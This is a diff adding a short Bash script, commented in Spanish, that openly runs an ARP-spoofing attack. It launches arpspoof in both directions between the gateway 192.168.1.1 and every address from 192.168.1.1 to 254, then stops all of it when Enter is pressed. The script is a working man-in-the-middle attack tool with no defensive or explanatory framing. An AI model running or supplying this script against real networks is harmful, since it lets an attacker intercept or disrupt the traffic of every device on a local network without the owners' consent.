@@ -1,0 +1,19 @@
+#!/bin/bash
+
+# Interfaz de red (reemplázala con tu interfaz)
+interface="eth0"
+
+# Dirección IP de la puerta de enlace
+gateway="192.168.1.1"
+
+# Realiza el ataque para todas las IP en el rango 192.168.1.1-254
+for ip in {1..254}
+do
+    target="192.168.1.$ip"
+    arpspoof -i "$interface" -t "$target" "$gateway" &
+    arpspoof -i "$interface" -t "$gateway" "$target" &
+done
+
+# Espera a que el usuario presione Enter antes de terminar
+read -p "Presiona Enter para detener el ataque..."
+killall arpspoof
